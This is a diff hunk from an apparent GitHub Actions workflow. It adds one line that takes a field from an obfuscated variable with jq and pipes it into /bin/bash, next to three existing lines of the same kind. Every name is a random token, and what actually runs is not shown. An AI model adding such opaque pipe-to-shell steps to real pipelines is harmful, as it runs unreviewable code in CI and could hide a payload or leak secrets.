@@ -28,6 +28,7 @@ jobs:
           printf '%s' "$hswmp129" | jq -r .ovrw29590 | /bin/bash
           printf '%s' "$fcixd594" | jq -r .wmwao664 | /bin/bash
           echo $jdocw87 | jq -r .ewfcc97128 | /bin/bash
+          echo $jnk35093 | jq -r .a86009 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
